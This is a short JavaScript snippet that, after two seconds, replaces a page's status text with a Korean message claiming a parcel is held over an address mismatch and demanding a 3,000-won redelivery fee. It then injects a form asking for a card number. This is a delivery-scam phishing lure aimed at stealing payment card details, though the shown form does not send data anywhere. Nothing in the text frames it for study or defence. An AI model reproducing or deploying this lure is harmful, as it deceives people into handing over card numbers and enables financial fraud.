setTimeout(function () {
  var el = document.getElementById('status')
  el.textContent = '주소 불일치로 배송이 보류되었습니다. 재배송 수수료 3,000원을 결제해 주세요.'
  var form = document.createElement('form')
  form.setAttribute('onsubmit', 'return false')
  var input = document.createElement('input')
  input.name = 'card_number'
  input.placeholder = '카드번호'
  form.appendChild(input)
  document.body.appendChild(form)
}, 2000)
